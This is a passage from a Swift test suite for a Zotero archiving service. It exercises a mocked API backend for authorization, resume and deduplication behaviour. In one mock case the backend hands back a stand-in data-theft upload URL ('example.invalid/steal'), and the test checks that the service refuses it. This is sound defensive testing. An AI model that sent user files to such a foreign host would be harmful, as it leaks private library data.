import Foundation
import CryptoKit

private final class MemoryCredentialStore: ZoteroCredentialStore, @unchecked Sendable {
    private let lock = NSLock()
    private var values: [String: Data] = [:]
    private var readCount=0
    private var saveCount=0,removeCount=0
    var failLoads=false
    var loads:Int { lock.withLock{readCount} }
    var saves:Int { lock.withLock{saveCount} }
    var removes:Int { lock.withLock{removeCount} }
    func snapshot()->[String:Data]{lock.withLock{values}}
    func load(serverID: String) throws -> Data? { try lock.withLock { readCount+=1;if failLoads{throw NSError(domain:"FixtureCredentialPermissionDenied",code:1)};return values[serverID] } }
    func save(_ data: Data, serverID: String) throws { lock.withLock { saveCount+=1;values[serverID] = data } }
    func remove(serverID: String) throws { lock.withLock { removeCount+=1;values[serverID]=nil } }
    func seed() throws { try save(JSONSerialization.data(withJSONObject: ["key": String(repeating: "x", count: 32), "remember": true]), serverID: "test-instance") }
}
private final class ZoteroMockProtocol: URLProtocol, @unchecked Sendable {
    nonisolated(unsafe) static var handler: ((URLRequest) throws -> (Int, [String: String], Data))?
    override class func canInit(with request: URLRequest) -> Bool { true }
    override class func canonicalRequest(for request: URLRequest) -> URLRequest { request }
    override func startLoading() {
        do {
            guard let handler = Self.handler else { throw URLError(.badServerResponse) }
            let (status, headers, data) = try handler(request)
            let response = HTTPURLResponse(url: request.url!, statusCode: status, httpVersion: "HTTP/1.1", headerFields: headers)!
            client?.urlProtocol(self, didReceive: response, cacheStoragePolicy: .notAllowed)
            client?.urlProtocol(self, didLoad: data); client?.urlProtocolDidFinishLoading(self)
        } catch { client?.urlProtocol(self, didFailWithError: error) }
    }
    override func stopLoading() {}
}
private final class MockZotero: @unchecked Sendable {
    var serverID = "test-instance"
    var userID = 42
    var validGeneratedKeys = false
    var beforePersonalWrite: (() -> Void)?
    var changeAccountDuringRawUpload = false
    var wireRequests: [(String,String)] = []
    var stagedFiles: [String:Data] = [:]
    var version = "10.0.6"
    var denied = false
    var oneTime = false
    var unauthorized = false
    var publicUnauthorizedPath:String?
    var failPDFUploadOnce = false
    var failJSONUploadOnce = false
    var foreignUploadURL = false
    var notesCorrupt = false
    var emptyFileReturns404 = false
    var omitEmptyParentScalars=false
    var parentScalarOverrides:[String:Any]=[:]
    var parentCreations=0
    var objects: [String: [String: Any]] = [:]
    var collections: [String: [String: Any]] = [:]
    var files: [String: Data] = [:]
    var uploads: [String: String] = [:]
    var hashes: [String: String] = [:]
    var filenames: [String: String] = [:]
    var rawUploadContentTypes: [String: String] = [:]
    var requests: [(String, String)] = []
    let storage: URL
    private var counter = 100
    init(storage: URL) { self.storage = storage }
    func key() -> String {
        counter += 1
        if validGeneratedKeys { var n=counter;var suffix="";for _ in 0..<4{suffix=String(2+n%8)+suffix;n/=8};return "ABCD"+suffix }
        return String(format: "ABCD%04d", counter)
    }
    func data(_ object: Any) throws -> Data { try JSONSerialization.data(withJSONObject: object) }
    func body(_ r: URLRequest) throws -> Data {
        if let body = r.httpBody { return body }
        guard let stream = r.httpBodyStream else { return Data() }
        stream.open(); defer { stream.close() }
        var result = Data(); var buffer = [UInt8](repeating: 0, count: 8192)
        while stream.hasBytesAvailable { let n = stream.read(&buffer, maxLength: buffer.count); if n <= 0 { break }; result.append(contentsOf: buffer.prefix(n)) }
        return result
    }
    func response(_ request: URLRequest) throws -> (Int, [String: String], Data) {
        let wirePath = request.url!.path, method = request.httpMethod ?? "GET"
        wireRequests.append((method,wirePath))
        if method != "GET", wirePath.hasPrefix("/api/users/") { beforePersonalWrite?(); beforePersonalWrite = nil }
        let wireComponents = wirePath.split(separator:"/").map(String.init)
        if wireComponents.count >= 3, wireComponents[1] == "users", let requestedID = Int(wireComponents[2]), requestedID != 0, requestedID != userID {
            return (400,["X-Zotero-Version":version,"Zotero-API-Version":"3","Zotero-Server-ID":serverID,"Content-Type":"application/json"],try data([:]))
        }
        // The mock validates the actual wire ID before routing. Canonical paths
        // below preserve all original semantic counters; wireRequests retain proof.
        let path = wireComponents.count >= 3 && wireComponents[1] == "users" ? "/api/users/0" + wirePath.dropFirst(("/api/users/"+wireComponents[2]).count) : wirePath
        requests.append((method, path))
        var headers = ["X-Zotero-Version": version, "Zotero-API-Version": "3", "Zotero-Server-ID": serverID, "Content-Type": "application/json"]
        if path == "/api/users/0/collections", userID > 0 { headers["Link"] = "<https://www.zotero.org/users/\(userID)/collections>; rel=\"alternate\"" }
        func responseObject(_ value:Any)->Any {
            if let list = value as? [[String:Any]] { return list.map{responseObject($0)} }
            guard var object = value as? [String:Any], object["key"] != nil, object["data"] != nil else { return value }
            object["library"] = ["type":"user","id":userID]; return object
        }
        func ok(_ object: Any, _ status: Int = 200) throws -> (Int, [String: String], Data) { (status, headers, try data(responseObject(object))) }
        if method == "GET", path == publicUnauthorizedPath || path + "/" == publicUnauthorizedPath { return try ok([:],401) }
        if path == "/api/" || path == "/api" { return (200, headers, Data("ready".utf8)) }
        if let requested = request.value(forHTTPHeaderField: "Zotero-Server-ID"), requested != serverID { return try ok([:], 412) }
        if method != "GET" && !path.hasPrefix("/api/local/uploads/") && path != "/api/local/authorize" {
            if unauthorized { return try ok([:], 401) }
            guard request.value(forHTTPHeaderField: "Zotero-API-Key")?.count == 32 else { return try ok([:], 401) }
        }
        if path == "/api/local/authorize" { return denied ? try ok(["denied": true],403) : try ok(["key": String(repeating: "x", count: 32), "remember": !oneTime]) }
        let components = path.split(separator: "/").map(String.init)
        if path == "/api/itemTypeFields" {
            let type = URLComponents(url: request.url!, resolvingAgainstBaseURL: false)?.queryItems?.first{$0.name == "itemType"}?.value ?? ""
            let common = ["title", "abstractNote", "date", "url", "extra", "language", "shortTitle", "rights"]
            let specific = ["preprint":["repository", "archiveID", "DOI", "genre"], "journalArticle":["publicationTitle", "volume", "issue", "pages", "DOI", "ISSN"], "conferencePaper":["proceedingsTitle", "conferenceName", "place", "pages", "DOI", "ISBN"], "webpage":["websiteTitle", "websiteType"]]
            return try ok((common + (specific[type] ?? [])).map{["field":$0]})
        }
        if path == "/api/users/0/collections" {
            if method == "GET" { return try ok(Array(collections.values)) }
            let entries = try JSONSerialization.jsonObject(with: body(request)) as! [[String: Any]]; let k = key()
            collections[k] = ["key": k, "version": 1, "data": entries[0]]
            return try ok(["success": ["0": k], "failed": [:]])
        }
        if components.count == 5 && components[3] == "collections", let object = collections[components[4]] { return try ok(object) }
        if path == "/api/users/0/items" {
            if method == "GET" { return try ok(objects.values.filter { ($0["data"] as? [String: Any])?["parentItem"] == nil }) }
            let wire = try body(request)
            let entries = try JSONSerialization.jsonObject(with: wire) as! [[String: Any]]
            // Native Zotero 10 fromJSON processes wire fields in order: the
            // filename setter requires linkMode to have already been applied.
            if entries[0]["itemType"] as? String == "attachment",
               let text = String(data:wire,encoding:.utf8),
               let filename = text.range(of:"\"filename\":"), let mode = text.range(of:"\"linkMode\":"),
               filename.lowerBound < mode.lowerBound {
                return try ok(["failed":["0":["code":400,"message":"Link mode must be set before setting attachment path"]]])
            }
            let k = key(); var object = entries[0]
            if object["parentItem"] == nil {
                parentCreations+=1
                if omitEmptyParentScalars { object=object.filter{!($0.value is String && ($0.value as? String)=="")} }
                object.merge(parentScalarOverrides){_,new in new}
            }
            if notesCorrupt && object["itemType"] as? String == "note" { object["note"] = (object["note"] as! String).replacingOccurrences(of: "验收笔记正文", with: "已被改变") }
            objects[k] = ["key": k, "version": 1, "data": object]
            return try ok(["success": ["0": k], "failed": [:]])
        }
        if path.hasPrefix("/api/local/uploads/") {
            let uploadKey = components.last!, k = uploads[uploadKey]!
            if failJSONUploadOnce && ((objects[k]!["data"] as! [String: Any])["contentType"] as? String)=="application/json" {
                failJSONUploadOnce=false;return (400,headers,Data("No file content provided".utf8))
            }
            if failPDFUploadOnce && ((objects[k]!["data"] as! [String: Any])["contentType"] as? String) == "application/pdf" {
                failPDFUploadOnce = false; return try ok([:],503)
            }
            let wire=try body(request)
            let contentType=request.value(forHTTPHeaderField:"Content-Type") ?? ""
            rawUploadContentTypes[k]=contentType
            // Installed Zotero server.js pre-parses application/json before
            // UploadReceiver, which rejects JSON objects as non-file input.
            if contentType=="application/json", (try? JSONSerialization.jsonObject(with:wire)) is [String:Any] {
                return (400,headers,Data("No file content provided".utf8))
            }
            stagedFiles[k] = wire
            if changeAccountDuringRawUpload { changeAccountDuringRawUpload = false; userID += 1 }
            return (201, headers, Data())
        }
        guard components.count >= 5, components[3] == "items" else { return try ok([:],404) }
        let k = components[4]
        if path.hasSuffix("/children") {
            return try ok(objects.values.filter { ($0["data"] as? [String: Any])?["parentItem"] as? String == k })
        }
        if path.hasSuffix("/file/view/url") {
            let url = storage.appendingPathComponent(k)
            guard let file = files[k] else {
                // The installed Zotero API exposes the intended storage URL for
                // an empty imported-file slot, before a file exists on disk.
                guard (objects[k]?["data"] as? [String:Any])?["itemType"] as? String == "attachment" else { return try ok([:],404) }
                if emptyFileReturns404 { return try ok([:],404) }
                return (200,headers,Data(url.absoluteString.utf8))
            }
            try file.write(to: url)
            return (200,headers,Data(url.absoluteString.utf8))
        }
        if path.hasSuffix("/file"), method == "POST" {
            let form = String(data: try body(request), encoding: .utf8)!
            let pairs = form.split(separator: "&").map { $0.split(separator: "=",maxSplits:1).map { String($0).removingPercentEncoding! } }
            let fields = Dictionary(uniqueKeysWithValues: pairs.map { ($0[0],$0[1]) })
            if let uploadKey = fields["upload"] {
                guard uploads[uploadKey] == k, let file = stagedFiles[k] else { return try ok([:],400) }
                files[k] = file; stagedFiles[k] = nil
                let actual = Insecure.MD5.hash(data:file).map { String(format:"%02x",$0) }.joined()
                guard actual == hashes[k] else { return try ok([:],400) }
                var object = objects[k]!, objectData = object["data"] as! [String: Any]
                objectData["md5"] = actual; objectData["filename"] = filenames[k]; object["data"] = objectData; objects[k] = object
                return (204,headers,Data())
            }
            let upload = UUID().uuidString; uploads[upload] = k; hashes[k] = fields["md5"]; filenames[k] = fields["filename"]
            let host = foreignUploadURL ? "https://example.invalid/steal" : "http://127.0.0.1:23119/api/local/uploads/" + upload
            return try ok(["url": host, "uploadKey": upload, "prefix":"", "suffix":"", "contentType": (objects[k]!["data"] as! [String:Any])["contentType"] ?? "application/octet-stream"])
        }
        guard var object = objects[k] else { return try ok([:],404) }
        if method == "PATCH" {
            let patch = try JSONSerialization.jsonObject(with: body(request)) as! [String: Any]
            var objectData = object["data"] as! [String: Any]; objectData.merge(patch) { _, new in new }; object["data"] = objectData; objects[k] = object
            return (204,headers,Data())
        }
        return try ok(object)
    }
}

@main struct ZoteroTests {
    static func require(_ value: Bool, _ message: String) throws { if !value { throw NSError(domain: "ZoteroTest", code: 1, userInfo: [NSLocalizedDescriptionKey:message]) } }
    static func main() async throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("zotero-service-tests-" + UUID().uuidString)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let pdf = root.appendingPathComponent("paper.pdf"), html = root.appendingPathComponent("guide.html")
        try Data("%PDF-1.7\nunit fixture; not a real publication".utf8).write(to:pdf)
        try Data("<html><body><h1>公开导读测试</h1><math><mi>x</mi></math><img src=\"data:image/png;base64,AA==\"></body></html>".utf8).write(to:html)
        let b = ZoteroService.Bibliography(title:"MiCLA unit fixture",creators:[.init(firstName:"Kohei",lastName:"Yamamoto",name:nil)],abstract:"Fixture only",date:"2026-10-20",doi:nil,url:"https://arxiv.org/abs/2610.27491v1",extra:"fixture",tags:["音频分类"])
        let input = ZoteroService.ArchiveRequest(identity:"arxiv:2610.27491v1",bibliography:b,collectionKey:nil,collectionName:"论文速递｜应用验收",pdfPath:pdf.path,guideHTMLPath:html.path,analysisHTML:"<p>明确测试解析，非论文事实。</p>",noteHTML:"<p>验收笔记正文</p>")
        var passed = 0
        var noteTitleFixtures: [[String:Any]] = []
        func noteMarker(_ role:String,_ html:String)->String { "PaperDigest-Note: "+role+":"+SHA256.hash(data:Data(html.utf8)).map{String(format:"%02x",$0)}.joined() }
        func captureTitle(_ name:String,_ note:String,_ html:String,_ role:String,_ expected:String,legacy:Bool=false) {
            noteTitleFixtures.append(["name":name,"note":note,"originalHTML":html,"marker":noteMarker(role,html),"expectedTitle":expected,"legacy":legacy])
        }
        func fixture(seed: Bool = true) throws -> (ZoteroService,MockZotero,MemoryCredentialStore) {
            let config = URLSessionConfiguration.ephemeral; config.protocolClasses = [ZoteroMockProtocol.self]
            let backendRoot=root.appendingPathComponent("mock-storage-"+UUID().uuidString)
            try FileManager.default.createDirectory(at:backendRoot,withIntermediateDirectories:true)
            let backend = MockZotero(storage:backendRoot), store = MemoryCredentialStore()
            if seed { try store.seed() }
            ZoteroMockProtocol.handler = { try backend.response($0) }
            return (ZoteroService(dataDirectory:root,session:URLSession(configuration:config),credentialStore:store),backend,store)
        }
        do {
            let (service,backend,credentials) = try fixture()
            let status = try await service.status(); try require(status.writesSupported && !status.authorized && status.authorizationState=="unknown" && credentials.loads==0,"status reports unknown without reading saved credential")
            _=try await service.collections();_=try await service.status()
            try require(credentials.loads==0,"ordinary collection/status refresh never loads Keychain")
            passed += 2
            let first = try await service.archive(input)
            try require(credentials.loads==1 && !backend.requests.contains{$0.1=="/api/local/authorize"},"explicit archive restores existing persistent grant once without requesting replacement")
            passed += 1
            try require(first.status=="complete" && first.steps.count==6 && backend.collections.count==1 && backend.objects.count==6,"complete archive")
            try require(backend.rawUploadContentTypes.count==3 && backend.rawUploadContentTypes.values.allSatisfy{$0=="application/octet-stream"},"all original file bytes use binary transport even when authorize returns actual JSON/PDF/HTML MIME")
            let metadataKey=first.steps.first{$0.role=="source-metadata"}!.key!,metadataData=backend.objects[metadataKey]!["data"] as! [String:Any]
            let metadata=try JSONSerialization.jsonObject(with:backend.files[metadataKey]!) as! [String:Any]
            try require(metadataData["contentType"] as? String=="application/json" && metadataData["filename"] as? String=="source-metadata.json","binary transport never changes persisted JSON attachment MIME or filename")
            try require(metadata["identity"] as? String==input.identity && (metadata["bibliography"] as? [String:Any])?["title"] as? String==input.bibliography.title,"JSON metadata arrives as exact parseable original bytes rather than a reencoded server object")
            passed += 3
            for (role,original,label) in [("analysis",input.analysisHTML!,"个人解析"),("note",input.noteHTML!,"研究笔记")] {
                let key=first.steps.first{$0.role==role}!.key!,actual=(backend.objects[key]!["data"] as! [String:Any])["note"] as! String
                try require(actual.hasPrefix("<div><p>音频研究工作台 · "+label+" · "+input.bibliography.title+"</p>") && actual.hasSuffix("<p>"+noteMarker(role,original)+"</p></div>") && actual.contains(original),"new note has human first line and original unchanged HTML/marker footer")
                captureTitle("actual-new-"+role,actual,original,role,"音频研究工作台 · "+label+" · "+input.bibliography.title)
                passed += 1
            }
            // Consume the ACTUAL journal+summary pair emitted by this service, rather
            // than hand-crafting a projection that could miss cross-service schema bugs.
            let personal=try DesktopStore(directory:root)
            let storage=DesktopStorage(directory:root,store:personal,bundledSeedDirectory:root.appendingPathComponent("no-seed"))
            let cleanup=try await storage.cleanupPlan()
            try require(cleanup["requiresConfirmation"] as? Bool==true && (cleanup["planID"] as? String).flatMap(UUID.init(uuidString:)) != nil,"cleanup accepts actual service journal+summary companion and remains a confirmation plan")
            passed += 1
            try require(first.identity==input.identity && first.title==input.bibliography.title,"result identity/title are bound to actual journal request")
            let bridgeResume=try await service.handle(command:"zotero.resume",payload:["resumeID":first.archiveID,"identity":"arxiv:0000.00000","bibliography":["title":"Spoofed current paper B"]],progress:{_ in})
            try require(bridgeResume["identity"] as? String==input.identity && bridgeResume["title"] as? String==input.bibliography.title && bridgeResume["archiveID"] as? String==first.archiveID,"resume result ignores payload identity/title and reloads original journal owner")
            passed += 2
            let writes = backend.requests.filter { $0.0=="POST" }.count
            let resumed = try await service.archive(input,resumeID:first.archiveID)
            try require(resumed.status=="complete" && backend.requests.filter{$0.0=="POST"}.count==writes,"idempotent resume")
            let second = try await service.archive(input)
            try require(second.parentKey==first.parentKey && backend.objects.count==6,"global exact identity and child dedup")
            let paddedInput = ZoteroService.ArchiveRequest(identity:"arxiv:2610.27491v1",bibliography:b,collectionKey:nil,collectionName:"  论文速递｜应用验收  ",pdfPath:pdf.path,guideHTMLPath:html.path,analysisHTML:"<p>明确测试解析，非论文事实。</p>",noteHTML:"<p>验收笔记正文</p>")
            let third = try await service.archive(paddedInput)
            try require(third.parentKey==first.parentKey && backend.collections.count==1,"whitespace-padded collectionName matches existing trimmed collection without creating duplicate")
            passed += 4
        }
        do {
            let (service,backend,_)=try fixture();backend.failJSONUploadOnce=true
            let first=try await service.archive(input)
            let pending=first.steps.first{$0.role=="source-metadata"}!
            try require(first.status=="partial" && pending.verified==false && pending.everVerified==false && pending.key != nil,"JSON upload400 preserves original owned unfinished metadata slot")
            let originalKey=pending.key!,count=backend.objects.count,parentCreations=backend.parentCreations
            let resumed=try await service.archive(input,resumeID:first.archiveID)
            let finished=resumed.steps.first{$0.role=="source-metadata"}!
            try require(resumed.status=="complete" && finished.verified && finished.everVerified==true && finished.key==originalKey && resumed.parentKey==first.parentKey,"resume JSON400 completes same parent and metadata key without rewriting journal identity")
            try require(backend.objects.count==count && backend.parentCreations==parentCreations && backend.rawUploadContentTypes[originalKey]=="application/octet-stream","resume JSON400 creates no duplicate parent/child and sends unchanged binary source bytes")
            passed += 3
        }
        do {
            let (service,backend,credentials)=try fixture()
            let checked=try await service.handle(command:"zotero.checkAuthorization",payload:[:],progress:{_ in})
            try require(checked["authorized"] as? Bool==true && checked["authorizationState"] as? String=="authorized" && credentials.loads==1,"explicit check restores saved grant without returning secret")
            try require(checked["key"]==nil && backend.objects.isEmpty && backend.requests.allSatisfy{$0.0=="GET"},"permission inspection creates no credential or library item")
            _=try await service.status();_=try await service.collections();_=try await service.authorize()
            try require(credentials.loads==1 && !backend.requests.contains{$0.1=="/api/local/authorize"},"known persistent grant survives refresh and authorize button without another grant")
            passed += 3
        }
        do {
            let (service,backend,credentials)=try fixture();credentials.failLoads=true
            _=try await service.status();try require(credentials.loads==0,"Keychain-denied status still never invokes provider")
            do{_=try await service.authorize();throw NSError(domain:"expected key permission refusal",code:1)}catch ZoteroService.ServiceError.verification{}
            let denied=try await service.status()
            try require(credentials.loads==1 && denied.authorizationState=="unavailable" && !backend.requests.contains{$0.1=="/api/local/authorize"} && backend.objects.isEmpty,"Keychain refusal does not mint new Zotero key or mutate library")
            credentials.failLoads=false;let restored=try await service.checkAuthorization()
            try require(restored.authorized && credentials.loads==2,"later explicit check recovers original saved key after denial")
            passed += 3
        }
        for route in ["/api/","/api/users/0/collections"] {
            let (service,backend,credentials)=try fixture();let original=credentials.snapshot(),saves=credentials.saves
            backend.publicUnauthorizedPath=route
            do{if route=="/api/"{_=try await service.status()}else{_=try await service.collections()};throw NSError(domain:"expected unauthenticated HTTP401",code:1)}catch ZoteroService.ServiceError.http(401){}
            try require(credentials.loads==0 && credentials.saves==saves && credentials.removes==0 && credentials.snapshot()==original,"public status/collections401 never reads, saves, deletes or alters persisted grant")
            backend.publicUnauthorizedPath=nil
            let status=try await service.status();try require(status.authorizationState=="unknown" && credentials.loads==0,"public401 does not falsely invalidate uninspected grant")
            passed += 2
        }
        do {
            let (service,backend,_)=try fixture();backend.omitEmptyParentScalars=true;backend.parentScalarOverrides=["date":NSNull()]
            var empty=input;empty.bibliography.date="";empty.bibliography.abstract="";empty.bibliography.fields=["language":"","shortTitle":"","rights":""]
            let first=try await service.archive(empty)
            try require(first.status=="partial" && first.steps.first{$0.role=="bibliography"}?.verified==false && backend.parentCreations==1 && backend.objects.count==1,"null date is not accepted as empty even when provider omits other empty scalars")
            let file=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json"),before=try JSONSerialization.jsonObject(with:Data(contentsOf:file)) as! [String:Any]
            let parent=first.parentKey!;var object=backend.objects[parent]!,data=object["data"] as! [String:Any];data["date"]=nil;object["data"]=data;backend.objects[parent]=object
            let resumed=try await service.archive(empty,resumeID:first.archiveID)
            let after=try JSONSerialization.jsonObject(with:Data(contentsOf:file)) as! [String:Any]
            try require(resumed.status=="complete" && resumed.archiveID==first.archiveID && resumed.parentKey==parent && backend.parentCreations==1,"original failed journal resumes same parent once actual empty date is omitted")
            try require((before["request"] as! NSDictionary)==(after["request"] as! NSDictionary) && before["createdParentPayload"] as? String==after["createdParentPayload"] as? String && before["fingerprint"] as? String==after["fingerprint"] as? String,"normal resume preserves original request, exact parent payload and source fingerprint")
            let payload=try JSONSerialization.jsonObject(with:Data(base64Encoded:before["createdParentPayload"] as! String)!) as! [String:Any]
            try require(payload["date"] as? String=="" && payload["abstractNote"] as? String=="" && payload["language"] as? String=="" && data["date"]==nil && data["abstractNote"]==nil,"only readback normalizes absence; original expected scientific metadata remains unchanged")
            passed += 4
        }
        for (field,actual): (String,Any) in [("date",NSNull()),("date",2026),("date",false),("date","user nonempty date"),("abstractNote",["not":"a string"]),("date",["invalid"])] {
            let (service,backend,_)=try fixture();backend.omitEmptyParentScalars=true;backend.parentScalarOverrides=[field:actual]
            var empty=input;empty.bibliography.date="";empty.bibliography.abstract=""
            let result=try await service.archive(empty)
            try require(result.status=="partial" && result.steps.first{$0.role=="bibliography"}?.verified==false && backend.files.isEmpty && backend.parentCreations==1,"empty scalar must reject explicit null, wrong type or user nonempty edit")
            passed += 1
        }
        for actual:Any? in [nil,"different date",NSNull(),2026] {
            let (service,backend,_)=try fixture();backend.parentScalarOverrides=actual.map{["date":$0]} ?? [:]
            let result=try await service.archive(input)
            if actual == nil {
                let parent=result.parentKey!;var item=backend.objects[parent]!,data=item["data"] as! [String:Any];data["date"]=nil;item["data"]=data;backend.objects[parent]=item
                let retry=try await service.archive(input,resumeID:result.archiveID)
                try require(retry.status=="partial" && retry.steps.first{$0.role=="bibliography"}?.verified==false && backend.parentCreations==1,"nonempty expected date may not disappear on original journal resume")
            } else {try require(result.status=="partial" && backend.files.isEmpty,"nonempty expected scalar stays exact across changed value or wrong type")}
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture(); backend.failPDFUploadOnce=true
            let partial=try await service.archive(input)
            try require(partial.status=="partial" && partial.steps.first{$0.role=="pdf"}?.verified==false && partial.steps.first{$0.role=="guide"}?.verified==true,"partial file failure")
            let count=backend.objects.count
            let resumed=try await service.archive(input,resumeID:partial.archiveID)
            try require(resumed.status=="complete" && backend.objects.count==count,"partial resume only missing file")
            passed += 2
        }
        do {
            let (service,backend,_) = try fixture()
            let complete=try await service.archive(input)
            let key=complete.steps.first{$0.role=="pdf"}!.key!
            backend.files.removeValue(forKey:key)
            try FileManager.default.removeItem(at:backend.storage.appendingPathComponent(key))
            var object=backend.objects[key]!, fields=object["data"] as! [String:Any]
            fields.removeValue(forKey:"md5");object["data"]=fields;backend.objects[key]=object
            for _ in 0..<2 {
                let before=backend.requests.count
                let result=try await service.archive(input,resumeID:complete.archiveID)
                try require(result.status=="partial" && result.steps.first{$0.role=="pdf"}?.verified==false,"deleted formerly verified file remains partial on repeated resume")
                try require(!backend.requests.dropFirst(before).contains{$0.0=="POST" && ($0.1.contains("/uploads/") || $0.1=="/api/users/0/items/\(key)/file")},"repeated resume never overwrites a formerly verified deleted file")
                passed += 2
            }
        }
        for missingVia404 in [false,true] {
            let (service,backend,_) = try fixture()
            let complete=try await service.archive(input),key=complete.steps.first{$0.role=="pdf"}!.key!
            backend.files.removeValue(forKey:key);try FileManager.default.removeItem(at:backend.storage.appendingPathComponent(key))
            backend.emptyFileReturns404=missingVia404
            var object=backend.objects[key]!,fields=object["data"] as! [String:Any]
            fields.removeValue(forKey:"md5");object["data"]=fields;backend.objects[key]=object
            let journal=root.appendingPathComponent("zotero-archives/"+complete.archiveID+".json")
            var legacy=try JSONSerialization.jsonObject(with:Data(contentsOf:journal)) as! [String:Any]
            var steps=legacy["steps"] as! [[String:Any]]
            for index in steps.indices {steps[index].removeValue(forKey:"everVerified");if steps[index]["role"] as? String=="pdf"{steps[index]["verified"]=false}}
            legacy["steps"]=steps;try JSONSerialization.data(withJSONObject:legacy).write(to:journal)
            for _ in 0..<2 {
                let before=backend.requests.count,resumed=try await service.archive(input,resumeID:complete.archiveID)
                try require(resumed.status=="partial" && resumed.steps.first{$0.role=="pdf"}?.verified==false,"legacy unknown verification history stays protected on repeated resume")
                try require(!backend.requests.dropFirst(before).contains{$0.0=="POST" && ($0.1.contains("/uploads/") || $0.1=="/api/users/0/items/\(key)/file")},"legacy unknown slot never receives replacement bytes")
                passed += 2
            }
            let beforeNew=backend.requests.count,newArchive=try await service.archive(input)
            try require(newArchive.status=="partial" && newArchive.parentKey==complete.parentKey && newArchive.archiveID != complete.archiveID,"new journal cannot turn adopted missing attachment into a fresh slot")
            try require(!backend.requests.dropFirst(beforeNew).contains{$0.0=="POST" && ($0.1.contains("/uploads/") || $0.1=="/api/users/0/items/\(key)/file")},"adopting existing missing file never uploads replacement bytes")
            passed += 2
        }
        do {
            let (service,backend,_) = try fixture();backend.failPDFUploadOnce=true
            let first=try await service.archive(input),oldKey=first.steps.first{$0.role=="pdf"}!.key!
            backend.objects.removeValue(forKey:oldKey)
            let journal=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json")
            var legacy=try JSONSerialization.jsonObject(with:Data(contentsOf:journal)) as! [String:Any]
            var steps=legacy["steps"] as! [[String:Any]]
            for index in steps.indices {steps[index].removeValue(forKey:"everVerified");if steps[index]["role"] as? String=="pdf"{steps[index].removeValue(forKey:"key");steps[index]["verified"]=false}}
            legacy["steps"]=steps;try JSONSerialization.data(withJSONObject:legacy).write(to:journal)
            let resumed=try await service.archive(input,resumeID:first.archiveID)
            try require(resumed.status=="complete" && resumed.parentKey==first.parentKey && resumed.steps.first{$0.role=="pdf"}?.key != oldKey,"legacy truly keyless slot can create and upload a fresh object without replacing a prior attachment")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture(seed:false);backend.denied=true
            let status=try await service.authorize();try require(!status.authorized && status.denied && backend.objects.isEmpty,"denied stays denied")
            backend.denied=false;backend.oneTime=true
            let once=try await service.authorize();try require(once.authorized && !once.remember,"one-time truthful status")
            do { _=try await service.archive(input);throw NSError(domain:"expected refusal",code:1) } catch ZoteroService.ServiceError.persistentAuthorizationRequired {}
            try require(backend.objects.isEmpty,"one-time stops before multistep write")
            passed += 3
        }
        do {
            let (service,backend,store)=try fixture();backend.unauthorized=true
            let result=try await service.archive(input)
            try require(result.status=="partial" && backend.objects.isEmpty && (try store.load(serverID:"test-instance"))==nil,"401 stops, no objects, clears own cache")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture();backend.foreignUploadURL=true
            let result=try await service.archive(input)
            try require(result.status=="partial" && backend.files.isEmpty && !backend.requests.contains{$0.1.contains("steal")},"foreign upload refused")
            passed += 1
        }
        do {
            let (service,backend,_)=try fixture();let first=try await service.archive(input)
            var originals:[String:String]=[:]
            for (role,html) in [("analysis",input.analysisHTML!),("note",input.noteHTML!)] {
                let key=first.steps.first{$0.role==role}!.key!,legacy="<div><p>"+noteMarker(role,html)+"</p>"+html+"</div>"
                var object=backend.objects[key]!,data=object["data"] as! [String:Any];data["note"]=legacy;object["data"]=data;backend.objects[key]=object;originals[key]=legacy
                captureTitle("legacy-"+role,legacy,html,role,noteMarker(role,html),legacy:true)
            }
            let writes=backend.requests.filter{$0.0 != "GET"}.count,count=backend.objects.count
            let journalFile=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json"),journalBytes=try Data(contentsOf:journalFile)
            let resumed=try await service.archive(input,resumeID:first.archiveID),same=try await service.archive(input)
            try require(resumed.status=="complete" && same.status=="complete" && resumed.steps.first{$0.role=="analysis"}?.key==first.steps.first{$0.role=="analysis"}?.key && same.steps.first{$0.role=="analysis"}?.key==first.steps.first{$0.role=="analysis"}?.key,"known legacy journal and same content new archive reuse original note key")
            try require(backend.objects.count==count && backend.requests.filter{$0.0 != "GET"}.count==writes && (try Data(contentsOf:journalFile))==journalBytes,"beautification never POSTs/PATCHes or rewrites original journal bytes")
            try require(originals.allSatisfy{key,value in (backend.objects[key]!["data"] as! [String:Any])["note"] as? String==value},"both legacy note original bytes remain unchanged")
            var changed=input;changed.analysisHTML=input.analysisHTML!+"<p>New actual evidence.</p>"
            let updated=try await service.archive(changed),newKey=updated.steps.first{$0.role=="analysis"}!.key!
            try require(updated.status=="complete" && backend.objects.count==count+1 && originals[newKey]==nil && originals.allSatisfy{key,value in (backend.objects[key]!["data"] as! [String:Any])["note"] as? String==value},"genuinely changed HTML creates exactly one new readable note while retaining old notes")
            let note=(backend.objects[newKey]!["data"] as! [String:Any])["note"] as! String
            captureTitle("changed-content",note,changed.analysisHTML!,"analysis","音频研究工作台 · 个人解析 · "+input.bibliography.title)
            passed += 4
        }
        for mutation in ["body","marker","heading"] {
            let (service,backend,_)=try fixture();let first=try await service.archive(input)
            let key=first.steps.first{$0.role=="analysis"}!.key!,original=(backend.objects[key]!["data"] as! [String:Any])["note"] as! String
            let edited=mutation=="body" ? original.replacingOccurrences(of:input.analysisHTML!,with:"<p>User-edited original analysis</p>") : mutation=="marker" ? original.replacingOccurrences(of:noteMarker("analysis",input.analysisHTML!),with:"") : original.replacingOccurrences(of:"音频研究工作台 · 个人解析 · "+input.bibliography.title,with:"My personal readable title")
            var object=backend.objects[key]!,data=object["data"] as! [String:Any];data["note"]=edited;object["data"]=data;backend.objects[key]=object
            let writes=backend.requests.filter{$0.0 != "GET"}.count,count=backend.objects.count,result=try await service.archive(input,resumeID:first.archiveID)
            try require((result.status=="complete") == (mutation=="heading"),"original HTML or missing marker fails; user wrapper-title edit stays permitted")
            try require((backend.objects[key]!["data"] as! [String:Any])["note"] as? String==edited && backend.objects.count==count && backend.requests.filter{$0.0 != "GET"}.count==writes,"user-edited note bytes never overwritten, repaired or replaced")
            passed += 2
        }
        do {
            let (service,backend,_)=try fixture();let first=try await service.archive(input)
